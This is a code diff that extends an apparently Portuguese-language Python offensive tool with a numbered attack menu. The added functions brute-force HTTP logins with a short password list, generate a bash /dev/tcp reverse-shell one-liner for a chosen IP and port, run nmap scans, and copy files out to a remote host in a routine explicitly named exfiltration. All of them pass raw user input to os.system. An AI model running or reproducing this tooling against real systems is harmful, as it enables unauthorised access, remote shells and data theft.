@@ -210,7 +210,64 @@ def sql_injection():
     except Exception as e:
         print(Fore.RED + f"[!] Erro ao realizar injeção SQL: {e}")
 
-# Função do menu
+def test_http_brute_force():
+    url = input(Fore.WHITE + "[+] Digite a URL para realizar o brute force HTTP: ")
+    username = input(Fore.WHITE + "[+] Digite o nome de usuário: ")
+    passwords = ['password1', '123456', 'letmein', 'welcome', 'admin']
+    print(Fore.YELLOW + "[+] Iniciando brute force HTTP...")
+    for password in passwords:
+        response = requests.post(url, data={'username': username, 'password': password})
+        if "Login successful" in response.text:
+            print(Fore.GREEN + f"[+] Senha encontrada: {password}")
+            break
+        print(Fore.RED + f"[+] Tentando senha: {password}")
+        time.sleep(1)
+
+def reverse_shell_payload():
+    ip = input(Fore.WHITE + "[+] Digite o IP para o reverse shell: ")
+    port = input(Fore.WHITE + "[+] Digite a porta para o reverse shell: ")
+    payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
+    print(Fore.YELLOW + "[+] Gerando payload para reverse shell...")
+    print(Fore.GREEN + f"[+] Payload: {payload}")
+    return payload
+
+def nmap_scan():
+    target = input(Fore.WHITE + "[+] Digite o IP alvo para o nmap scan: ")
+    print(Fore.YELLOW + "[+] Realizando scan de vulnerabilidades com nmap...")
+    try:
+        os.system(f"nmap -sV {target}")
+    except Exception as e:
+        print(Fore.RED + f"[!] Erro ao realizar o nmap scan: {e}")
+
+def file_transfer():
+    remote_ip = input(Fore.WHITE + "[+] Digite o IP remoto para transferência de arquivos: ")
+    remote_path = input(Fore.WHITE + "[+] Digite o caminho do arquivo remoto: ")
+    local_path = input(Fore.WHITE + "[+] Digite o caminho local para salvar o arquivo: ")
+    print(Fore.YELLOW + "[+] Iniciando transferência de arquivo...")
+    try:
+        os.system(f"scp user@{remote_ip}:{remote_path} {local_path}")
+        print(Fore.GREEN + "[+] Transferência realizada com sucesso!")
+    except Exception as e:
+        print(Fore.RED + f"[!] Erro ao transferir o arquivo: {e}")
+
+def custom_payload():
+    print(Fore.YELLOW + "[+] Gerando um payload customizado...")
+    payload = input(Fore.WHITE + "[+] Digite o payload customizado: ")
+    print(Fore.GREEN + f"[+] Payload gerado: {payload}")
+    return payload
+
+def exfiltrate_file():
+    file_path = input(Fore.WHITE + "[+] Digite o caminho do arquivo a ser exfiltrado: ")
+    remote_ip = input(Fore.WHITE + "[+] Digite o IP remoto para onde os dados serão enviados: ")
+    print(Fore.YELLOW + "[+] Exfiltrando arquivo...")
+    try:
+        os.system(f"scp {file_path} user@{remote_ip}:/tmp")
+        print(Fore.GREEN + "[+] Exfiltração de arquivo bem-sucedida!")
+    except Exception as e:
+        print(Fore.RED + f"[!] Erro ao exfiltrar arquivo: {e}")
+
+# Função do menu com todas as opções
+
 def menu():
     while True:
         os.system('cls' if os.name == 'nt' else 'clear')
@@ -234,6 +291,12 @@ def menu():
 [17] Payload Reverso
 [18] Ataque XSS
 [19] Injeção SQL
+[20] Teste de Força Bruta em HTTP
+[21] Enviar Payload Reverso
+[22] Scanner de Vulnerabilidades com Nmap
+[23] Transferência de Arquivos Remotos
+[24] Payload Customizado
+[25] Exfiltração de Arquivo
 [0] Sair
 ''')
         choice = input(Fore.WHITE + "[+] Escolha uma opção: ")
@@ -276,6 +339,18 @@ def menu():
             xss_attack()
         elif choice == '19':
             sql_injection()
+        elif choice == '20':
+            test_http_brute_force()
+        elif choice == '21':
+            reverse_shell_payload()
+        elif choice == '22':
+            nmap_scan()
+        elif choice == '23':
+            file_transfer()
+        elif choice == '24':
+            custom_payload()
+        elif choice == '25':
+            exfiltrate_file()
         elif choice == '0':
             print(Fore.GREEN + "[+] Saindo...")
             break
